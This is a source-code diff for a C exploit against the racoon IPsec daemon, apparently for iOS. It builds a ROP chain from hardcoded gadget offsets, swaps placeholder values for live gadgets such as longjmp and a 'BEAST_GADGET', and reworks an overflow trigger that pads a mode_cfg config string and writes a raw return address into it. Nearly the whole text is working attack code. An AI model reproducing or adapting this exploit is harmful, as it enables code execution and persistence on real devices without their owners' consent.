@@ -123,6 +123,7 @@ void write_to_lcconf(uint32_t what) {
 
 	// if we only want a 32 bit write we should get one and don't zero out the other 32 bits
 	// this is an improvment from the script where we used padding and maximum_length to only write 32 bits each iteration
+	// IDK if this works like it should... FIXME: there is a chance that we acc want to write 64 bit with the upper once being zero
 	if (higher != 0) {
 		snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, "interval%usec;",higher);
 	}
@@ -131,15 +132,18 @@ void write_to_lcconf(uint32_t what) {
 	write(fd,buf,strlen(buf)); // write it to the config file
 }
 
-void trigger_exec(int fd,char * controllable_buf) {
-	if (strlen(controllable_buf) > 250) {
-		printf("Something is wrong, I don't expect such a large buffer here\n");
-		exit(0);
-	}
+// the main problem here is that an address can contain (and will contain) zero chars so we can't use strlen and strcat
+void trigger_exec(int fd,uint32_t padding, uint64_t address) {
 	char buf[1024] = "mode_cfg{default_domain\"";
-	strcat(buf,controllable_buf);
+	// add padding (should never reach 100)
+	for (int i = 0; i < (padding+8) && i < 100; i++) {
+		strcat(buf,"A");
+	}
+	void* address_in_buf = (void*)((uint64_t)&buf+strlen(buf)-8);
 	strcat(buf,"\";}");
-	write(fd,buf,strlen(buf)); // write it to the config file
+	int len = strlen(buf);
+	memcpy(address_in_buf,&address,8);
+	write(fd,buf,len); // write it to the config file
 }
 
 void www64(int fd,offset_struct_t * offsets, uint64_t where, uint64_t what) {
@@ -175,29 +179,20 @@ void stage1(int fd, offset_struct_t * offsets) {
 
 	// get an address which is in the region that is always writeable and doesn't cotain a quote if we convert it into a string
 	uint64_t ropchain_addr = get_ropchain_addr(offsets);
+	printf("Chain will be at: %llx\n",ropchain_addr);
 
 	// write all the values which shouldn't be slid
 	rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
 	uint64_t curr_ropchain_addr = ropchain_addr;
-	union converter {
-		uint64_t addr;
-		char buf[9];
-	};
-	union converter tmp;
-	memset(&tmp.buf,0,sizeof(tmp.buf));
-	tmp.addr = ropchain_addr;
-	char buf[128] = "";
-	// add padding (should never reach 100)
-	for (int i = 0; i < offsets->str_buff_offset && i < 100; i++) {
-		strcat(buf,"A");
-	}
-	strcat(buf,tmp.buf);
+
 	while (curr_gadget != NULL) {
 		switch(curr_gadget->type) {
 			case STATIC:
 				www64(fd,offsets,curr_ropchain_addr, curr_gadget->value);
+				break;
 			case OFFSET:
 				www64(fd,offsets,curr_ropchain_addr,ropchain_addr+curr_gadget->value);
+				break;
 			default:
 				break;
 		}
@@ -223,7 +218,7 @@ void stage1(int fd, offset_struct_t * offsets) {
 			curr_gadget = curr_gadget->next;
 			curr_ropchain_addr += 8;
 		}
-		trigger_exec(fd,(char*)&buf);
+		trigger_exec(fd,offsets->str_buff_offset, ropchain_addr);
 	}
 }
 
@@ -267,6 +262,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.dns4_array_to_lcconf = -((0x100067c10+0x28-4*8)-0x1000670e0);
 	myoffsets.lcconf_counter_offset = 0x10c;
 	myoffsets.memmove = 0x1aa0b8bb8;
+	myoffsets.longjmp = 0x180a817dc;
 	myoffsets.max_slide = 0x66dc000;
 	myoffsets.slide_value = 0x4000;
 	myoffsets.pivot_x21 = 0x1990198fc;
@@ -378,8 +374,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	ADD_OFFSET_GADGET(0xb0);				   // 0x38		[2] x26 [3] x0/first arg
 	ADD_CODE_GADGET(myoffsets.open);		   // 0x40		[2] x27 [3] call gadget
 	ADD_GADGET();							   // 0x48		[2] x28 
-	//ADD_CODE_GADGET(myoffsets.longjmp);		   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
-	ADD_STATIC_GADGET(0x42424242);
+	ADD_CODE_GADGET(myoffsets.longjmp);		   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
 	ADD_CODE_GADGET(myoffsets.BEAST_GADGET);   // 0x58		[2] x30 (next gadget)
 	ADD_GADGET();							   // 0x60		[2] x29
 	ADD_OFFSET_GADGET(0xb0);				   // 0x68		[2] x2  (new stack)
@@ -407,8 +402,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	ADD_GADGET();							   // 0x110		[3] x20 [4] x6/seventh arg
 	ADD_GADGET();							   // 0x118		[3] x19 [4] x7/eighth arg
 	ADD_GADGET();							   // 0x120		[3] x29
-	//ADD_CODE_GADGET(myoffsets.BEAST_GADGET);   // 0x128		[3] x30 (next gadget)
-	ADD_STATIC_GADGET(0x41414141);
+	ADD_CODE_GADGET(myoffsets.BEAST_GADGET);   // 0x128		[3] x30 (next gadget)
 
 	ADD_GADGET();							   // 0x130		[3] new stack top
 	ADD_GADGET();							   // 0x138		
